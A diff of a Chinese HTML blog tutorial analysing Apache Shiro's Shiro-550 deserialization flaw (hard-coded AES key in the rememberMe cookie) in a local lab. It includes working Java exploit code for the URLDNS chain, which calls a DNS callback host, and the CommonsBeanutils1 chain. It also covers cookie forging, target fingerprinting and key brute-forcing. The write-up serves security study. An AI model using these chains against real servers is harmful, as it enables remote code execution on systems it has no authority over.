@@ -295,27 +295,27 @@
 <h1 id="Java-反序列化-Shiro-篇-01-Shiro550-流程分析"><a href="#Java-反序列化-Shiro-篇-01-Shiro550-流程分析" class="headerlink" title="Java 反序列化 Shiro 篇 01-Shiro550 流程分析"></a>Java 反序列化 Shiro 篇 01-Shiro550 流程分析</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>shiro550 的根本原因：固定 key 加密</p>
 <h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><ul>
 <li>jdk8u65</li>
-<li><a class="link"   target="_blank" rel="noopener" href="https://tomcat.apache.org/download-80.cgi" >Tomcat8<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link" target="_blank" rel="noopener" href="https://tomcat.apache.org/download-80.cgi">Tomcat8<i class="fas fa-external-link-alt"></i></a></li>
 <li>shiro 1.2.4</li>
 </ul>
 <p>漏洞影响版本：Shiro &lt;&#x3D; 1.2.4</p>
 <p>搭建环境这里比较费心思，慢慢来。</p>
 <p>jdk8u65 和 tomcat8 的配置比较简单，直接下载，跟着安装就可以。tomcat8 下载这个包</p>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/InstallTomcat.png" class>
 
 <h3 id="Tomcat8-在-IDEA-中配置"><a href="#Tomcat8-在-IDEA-中配置" class="headerlink" title="Tomcat8 在 IDEA 中配置"></a>Tomcat8 在 IDEA 中配置</h3><ul>
-<li>这里我们先 clone 一下 P神的项目：<a class="link"   target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings/tree/master/shirodemo" >https://github.com/phith0n/JavaThings/tree/master/shirodemo<i class="fas fa-external-link-alt"></i></a></li>
+<li>这里我们先 clone 一下 P神的项目：<a class="link" target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo<i class="fas fa-external-link-alt"></i></a></li>
 </ul>
 <h4 id="1-用-IDEA-打开这个项目，去到-Settings-界面"><a href="#1-用-IDEA-打开这个项目，去到-Settings-界面" class="headerlink" title="1. 用 IDEA 打开这个项目，去到 Settings 界面"></a>1. 用 IDEA 打开这个项目，去到 Settings 界面</h4><p>如图配置，在 Add 的时候选择 <strong>Tomcat Server</strong> 这一选项。</p>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/TomcatAdd.png" class>
 
 <h4 id="2-选择-Project-Structure"><a href="#2-选择-Project-Structure" class="headerlink" title="2. 选择 Project Structure"></a>2. 选择 Project Structure</h4><p>这里 P神 已经把项目弄好了，我们可以看一看。</p>
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/WebArtifacts.png" class>
 
-
-<h4 id="3-配置-Edit-Configurations"><a href="#3-配置-Edit-Configurations" class="headerlink" title="3. 配置 Edit Configurations"></a>3. 配置 Edit Configurations</h4>
+<h4 id="3-配置-Edit-Configurations"><a href="#3-配置-Edit-Configurations" class="headerlink" title="3. 配置 Edit Configurations"></a>3. 配置 Edit Configurations</h4><img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/EndTomcat.png" class>
 
 <h4 id="4-运行测试"><a href="#4-运行测试" class="headerlink" title="4. 运行测试"></a>4. 运行测试</h4><p>右键 login.jsp，运行之后会有一堆爆红，然后是 404 的界面，这个时候我们点击 IDEA 自带的用浏览器打开前端界面即可，这样就可以访问成功了。</p>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/SuccessTest.png" class>
 
 <p>登录的 username 和 password 默认是 root 与 secret。</p>
 <ul>
@@ -324,7 +324,7 @@
 <h2 id="0x03-Shiro-550-分析"><a href="#0x03-Shiro-550-分析" class="headerlink" title="0x03 Shiro-550 分析"></a>0x03 Shiro-550 分析</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><ul>
 <li>勾选 RememberMe 字段，登陆成功的话，返回包 set-Cookie 会有 rememberMe&#x3D;deleteMe 字段，还会有 rememberMe 字段，之后的所有请求中 Cookie 都会有 rememberMe 字段，那么就可以利用这个 rememberMe 进行反序列化，从而 getshell。</li>
 </ul>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/RememberMe.png" class>
 
 <p>Shiro1.2.4 及之前的版本中，AES 加密的密钥默认<strong>硬编码</strong>在代码里（Shiro-550），Shiro 1.2.4 以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。</p>
 <h3 id="漏洞角度分析-Cookie"><a href="#漏洞角度分析-Cookie" class="headerlink" title="漏洞角度分析 Cookie"></a>漏洞角度分析 Cookie</h3><ul>
@@ -342,46 +342,46 @@
 <li>要找 Cookie 的加密过程，直接在 IDEA 里面全局搜索 Cookie，去找 Shiro 包里的类。</li>
 </ul>
 <p>最后我们找到相关的类是 <code>CookieRememberMeManager</code>，其中，在观察了一圈之后，将目光锁定到 <code>getRememberedSerializedIdentity()</code> 这个方法上。</p>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/getRememberedSerialized.png" class>
 
 <p>这里的前面，先判断是否为 HTTP 请求，如果是的话，获取 cookie 中 rememberMe 的值，然后判断是否是 deleteMe，不是则判断是否是符合 base64 的编码长度，然后再对其进行 base64 解码，将解码结果返回。</p>
 <p>我们逆向上去，看一下谁调用了 <code>getRememberedSerializedIdentity()</code> 这个方法。</p>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/Find01.png" class>
 
 <p>找到了 <code>AbstractRememberMeManager</code> 这个接口的 <code>getRememberedPrincipals()</code> 方法。</p>
 <p><code>getRememberedPrincipals()</code> 方法的作用域为 <strong>PrincipalCollection</strong>，一般就是用于聚合多个 Realm 配置的集合。</p>
 <p>这里 393，396 行；393 行 ———— 将 HTTP Requests 里面的 Cookie 拿出来，赋值给 bytes 数组；396 行将 bytes 数组的东西进行 <code>convertBytesToPrincipals()</code> 方法的调用，并将值赋给 principals 变量。</p>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/getRememberedPrincipals.png" class>
 
 <p><code>convertBytesToPrincipals()</code> 这个方法将之前的 bytes 数组转换成了认证信息，在 <code>convertBytesToPrincipals()</code> 这个方法当中，很明确地做了两件事，一件是 <strong>decrypt</strong> 的解密，另一件是 <strong>deserialize</strong> 的反序列化。</p>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/convertBytesToPrincipals.png" class>
 
 <ul>
 <li>先进到解密的 <code>decrypt()</code> 方法里面看看。</li>
 </ul>
-<h5 id="解密过程之-decrypt-方法"><a href="#解密过程之-decrypt-方法" class="headerlink" title="解密过程之 decrypt() 方法"></a>解密过程之 <code>decrypt()</code> 方法</h5>
+<h5 id="解密过程之-decrypt-方法"><a href="#解密过程之-decrypt-方法" class="headerlink" title="解密过程之 decrypt() 方法"></a>解密过程之 <code>decrypt()</code> 方法</h5><img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/decrypt.png" class>
 
 <p>第 487 行，先是获取了密钥服务，也就是实现 AOP 的实现类，再往后 489 行的 <code>decrypt()</code> 跟进去，发现它是一个接口。我们可以看一下它的参数名</p>
 <p>第一个要加密的数组，第二个是一个 key，说明这是一个对称加密，我们重点去关注一下 key。</p>
 <p>回到之前 <code>decrypt()</code> 方法的第 489 行，两个传参，第一个是 Cookie，第二个是 key，跟进传入的 getDecryptionCipherKey</p>
 <p>最终发现这个东西是个常量，过程如下</p>
 <p>先点进 <code>getDecryptionCipherKey</code> 这个参数，进去之后发现这是一个 btye[] 的方法，返回了 <code>decryptionCipherKey</code>。<code>decryptionCipherKey</code> 这里，我们找一找谁调用了它。</p>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/get2decrypt.png" class>
 
 <p>跟进去 <code>decryptionCipherKey()</code> 之后，查看谁调用了它，发现是 <code>setDecryptionCipherKey()</code> 方法，这里有点没看懂赋值的原理，所以再往上找一找，看谁调用了 <code>setDecryptionCipherKey()</code> </p>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/setKey.png" class>
 
 <p>同样的二次跟进，终于找到不一样的东西了。</p>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/setCipherKey.png" class>
 
 <p>非常显而易见的，第 109 行的 <code>DEFAULT_CIPHER_KEY_BYTES</code>，我们跟进去发现它的一个常量，是一个固定的值。</p>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/DefaultKey.png" class>
 
 <p>一整条寻找的思路如下图所示，这里我们发现 shiro 进行 Cookie 加密的 AES 算法的密钥是一个常量。</p>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/Gaget.png" class>
 
 <h5 id="解密过程之-deserialize-反序列化"><a href="#解密过程之-deserialize-反序列化" class="headerlink" title="解密过程之 deserialize 反序列化"></a>解密过程之 <code>deserialize</code> 反序列化</h5><p>在之前 <code>convertBytesToPrincipals()</code> 这个方法的地方，点进去。是一个接口，再看一看接口里面的 <code>deserial</code> 的实现方法有哪些</p>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/deserialize.png" class>
 
 <p>点进 shiro 包的 <code>deserial()</code> 方法，这里面的 <code>deserial()</code> 方法调用了 <code>readObject()</code>，所以这里反序列化的地方是一个很好的入口类。</p>
 <p>至此，Shiro 拿到 HTTP 包里的 Cookie 的解密过程已经梳理地很清楚了，我们再回头看一看那一段 Cookie 是如何产生的，也就是加密过程。</p>
@@ -389,15 +389,15 @@
 <li>加密分析这里用的是打断点调试。断点位置打在 AbstractRememberMeManager 接口的 onSuccessfulLogin 方法处。</li>
 </ul>
 <p>这里打断点刚开始会有点烦，会判断是否是 HTTP 什么的，所以直接 F8 跳过就好，进入到 <code>if (isRememberMe(token))</code> 的判断；这个判断这里，简单判断 RememberMe 字段是否为 true，再调用了 <code>rememberIdentity()</code> 方法</p>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/rememberMeTrue.png" class>
 
 <p>断点至 297 行时，F7 进入 <code>rememberIdentity()</code> 方法，这里一串调用，保存用户名。</p>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/indentify.png" class>
 
 <ul>
 <li>再回到 <code>rememberIdentity()</code> 方法，跟进<code>this.rememberIdentity(subject, principals)</code>：调试手法如图</li>
 </ul>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/rememberIdentity.png" class>
 
 
 
@@ -405,25 +405,25 @@
 <blockquote>
 <p>先看序列化的这段，和之前一样反序列化找的过程一致，序列化最后如图</p>
 </blockquote>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/serializeDone.png" class>
 
 <blockquote>
 <p>再回去看 encrypt 加密的那一段</p>
 </blockquote>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/encryptCode.png" class>
 
 <p>这里我们能够看出加密算法是 AES 了，AES 是一种对称加密算法，继续往下跟，最后是找到加密 Key 用的是一个常量。大致要找的话，思路和之前是一样的</p>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/DefaultKey2.png" class>
 
 <p>后续加密这里，通过 AES 加密之后的 Cookie，拿去 Base64 编码。</p>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/Cookie.png" class>
 
 <p>以上分析就是全过程了 ~</p>
 <h2 id="0x04-Shiro-550-漏洞利用"><a href="#0x04-Shiro-550-漏洞利用" class="headerlink" title="0x04 Shiro-550 漏洞利用"></a>0x04 Shiro-550 漏洞利用</h2><blockquote>
 <p>这里利用会讲 Shiro-550 与 URLDNS 链、CC6 链、Commons-Beanutils1 链这三种攻击方式的利用。</p>
 </blockquote>
 <p>我们可以先安装一个依赖，在 IDEA 中搜索 “Maven Helper” 即可，分析依赖的效果如图所示。</p>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/DenpendcyAnalyzer.png" class>
 
 <h3 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h3><ul>
 <li>既然 RCE，或者说弹 shell，是在反序列化的时候触发的。</li>
@@ -440,22 +440,22 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.net.URL;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNSEXP</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap= <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();  </span><br><span class="line"> <span class="comment">// 这里不要发起请求  </span></span><br><span class="line"> <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://2twuuia2kxz9bqztec49jpphj8pzdo.oastify.com&quot;</span>);  </span><br><span class="line"> <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();  </span><br><span class="line"> <span class="type">Field</span> <span class="variable">hashcodefile</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);  </span><br><span class="line"> hashcodefile.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"> hashcodefile.set(url,<span class="number">1234</span>);  </span><br><span class="line"> hashmap.put(url,<span class="number">1</span>);  </span><br><span class="line"> <span class="comment">// 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性  </span></span><br><span class="line"> hashcodefile.set(url,-<span class="number">1</span>);  </span><br><span class="line"> serialize(hashmap);  </span><br><span class="line"> <span class="comment">//unserialize(&quot;ser.bin&quot;);  </span></span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line"> oos.writeObject(obj);  </span><br><span class="line"> &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line"> <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line"> <span class="keyword">return</span> obj;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>第 19 行，先不要进行反序列化的操作，将序列化得到的 ser.bin 放到之前写好的 python 脚本里面跑，如图。</p>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/pySuccess.png" class>
 
 <p>再将 AES 加密出来的编码替换包中的 RememberMe Cookie，将 JSESSIONID 删掉，因为当存在 JSESSIONID 时，会忽略 rememberMe。</p>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/ChangeCookie.png" class>
 
 <p>发包之后，我们会收到 DNS 的请求，如图</p>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/SuccessURLDNS.png" class>
 
 <h3 id="通过-CC11-链攻击"><a href="#通过-CC11-链攻击" class="headerlink" title="通过 CC11 链攻击"></a>通过 CC11 链攻击</h3><ul>
 <li>这里踩了很久的坑，原因我也不知道是为什么，出现了一个，就是字节码一直加载不进去，报错报的是 “Translet 类无法找到 Calc 名”</li>
 </ul>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/error.png" class>
 
 <p>后续解决的也很奇怪，修改了 jdk 版本就可以了，我之前是 1.7 的环境，换成了 1.8；</p>
 <p>用 EXP 攻击，编码，发包即可。</p>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/CC11.png" class>
 
 <h3 id="通过-CB1-链攻击"><a href="#通过-CB1-链攻击" class="headerlink" title="通过 CB1 链攻击"></a>通过 CB1 链攻击</h3><p>分析过程与 EXP 已经在之前写过了，分析过程就不写了，主要是如何使用的问题，先贴出我们的脚本</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CB1EXP</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\JavaClass\\TemplatesBytes.class&quot;</span>));  </span><br><span class="line"> <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line"> setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Calc&quot;</span>);  </span><br><span class="line"> setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);  </span><br><span class="line"> setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line"> <span class="comment">//    templates.newTransformer();  </span></span><br><span class="line"> <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();  </span><br><span class="line"> <span class="comment">// 创建新的队列，并添加恶意字节码  </span></span><br><span class="line"> <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, beanComparator);  </span><br><span class="line"> queue.add(<span class="number">1</span>);  </span><br><span class="line"> queue.add(<span class="number">1</span>);  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">// 将 property 的值赋为 outputProperties setFieldValue(beanComparator, &quot;property&quot;, &quot;outputProperties&quot;);  </span></span><br><span class="line"> setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);  </span><br><span class="line"> serialize(queue);  </span><br><span class="line"> <span class="comment">//    unserialize(&quot;ser.bin&quot;);  </span></span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line"> field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"> field.set(obj, value);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line"> oos.writeObject(obj);  </span><br><span class="line"> &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line"> <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line"> <span class="keyword">return</span> obj;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -478,17 +478,17 @@
 </blockquote>
 <p>简单来说就是没找到 <code>org.apache.commons.collections.comparators.ComparableComparator</code> 类，从包名即可看出，这个类是来自于commons-collections。</p>
 <p>commons-beanutils本来依赖于commons-collections，但是在Shiro中，它的commons-beanutils虽然包含了一部分commons-collections的类，但却不全。这也导致，正常使用Shiro的时候不需要依赖于commons-collections，但反序列化利用的时候需要依赖于commons-collections。</p>
-
+<img src="/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/CB1.png" class>
 <h2 id="0x05-漏洞探测"><a href="#0x05-漏洞探测" class="headerlink" title="0x05 漏洞探测"></a>0x05 漏洞探测</h2><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><p>在利用 shiro 漏洞时需要判断应用是否用到了 shiro。在请求包的 Cookie 中为 <code>rememberMe</code> 字段赋任意值，收到返回包的 Set-Cookie 中存在 <code>rememberMe=deleteMe</code> 字段，说明目标有使用 Shiro 框架，可以进一步测试。</p>
 <h3 id="AES密钥判断"><a href="#AES密钥判断" class="headerlink" title="AES密钥判断"></a>AES密钥判断</h3><p>前面说到 Shiro 1.2.4 以上版本官方移除了代码中的默认密钥，要求开发者自己设 置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。 但是即使升级到了1.2.4以上的版本，很多开源的项目会自己设定密钥。可以收集密钥的集合，或者对密钥进行爆破。</p>
-<p>那么如何判断密钥是否正确呢？文章 <a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&mid=2247485052&idx=1&sn=b007a722e233b45982b7a57c3788d47d&scene=21#wechat_redirect" >一种另类的 shiro 检测方式<i class="fas fa-external-link-alt"></i></a>提供了思路，当密钥不正确或类型转换异常时，目标 Response 包含 <code>Set-Cookie：rememberMe=deleteMe</code> 字段，而当密钥正确且没有类型转换异常时，返回包不存在 <code>Set-Cookie：rememberMe=deleteMe</code> 字段。</p>
